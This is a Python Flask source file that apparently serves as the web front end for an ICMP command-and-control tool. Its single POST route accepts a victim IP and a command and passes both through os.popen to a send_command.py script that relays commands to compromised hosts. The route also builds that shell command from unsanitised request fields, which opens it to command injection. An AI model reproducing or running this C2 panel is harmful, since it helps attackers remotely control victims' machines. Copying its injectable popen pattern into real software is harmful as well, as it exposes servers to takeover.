from flask import Flask, render_template, request
from os import popen

app = Flask("__app__")

from pathlib import Path
dirname = Path(__file__).parent.resolve()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/processd", methods=["POST"])
def processd():
    # Does nothing with return port
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    output = popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py").read()
    return output

app.run(host="0.0.0.0", port=80)